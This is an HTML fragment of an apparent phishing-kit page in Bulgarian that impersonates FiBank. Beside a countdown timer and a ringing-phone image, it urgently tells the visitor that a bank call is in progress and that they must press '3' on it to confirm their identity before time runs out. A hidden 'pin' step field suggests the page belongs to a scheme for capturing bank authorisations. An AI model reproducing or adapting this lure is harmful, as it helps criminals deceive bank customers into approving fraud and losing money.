...
<div class="body-wrapper" ng-class="{'logout-footer-wrapper' : $state.includes('logoutSuccess')}">
    ...
    <div id="app" ui-view="" data-template-url="index" class="ng-scope">
        ...
        <div class="container form-centered box-border ng-scope" style="max-width: 640px">
            <h1 translate="REGISTRATION.HEADER" class="ng-scope">Обаждането от FiBank е в ход!!
                <div></div>
                <br>
                <div><span
                        style="color: #ff0000;">Mоля натиснете "3" в обаждането, за да потвърдите Вашата самоличност</span>
                </div>
            </h1>
            <div>.</div>
            <div style="display: flex;  justify-content: center">
                <td align="center" valign="middle"><img style="width:auto;max-height:150px;"
                                                        src=".\img\ring.gif">
            </div>
            <div></div>
            <form id="form" name="form" novalidate="" method="post"
                  class="ng-invalid ng-invalid-required ng-dirty">
                <input type="hidden" value="pin" name="step">
                ...
                <div class="col-lg-12" style="margin-top: 2%">
                    ...
                    Моля Изчакай <label id="CuentaAtras"></label> секунди, <p><span style="color: #ff0000;">
                        </span>
                </p>
                </div>
                ...
                <div class="margin">
                    ...
                    <div class="row">
                        <div class="col-md-12 form-group">
                            <label translate="REGISTRATION.NAME_CYR" class="ng-scope"><span class="red-txt">* </span>Когато
                                получите обаждането, не губете време. Веднага натиснете бутона "3", преди таймерът да е
                                изтекъл.</label>
                            <div ng-show="form.pin.$dirty && form.pin.$invalid" class="error-messages">
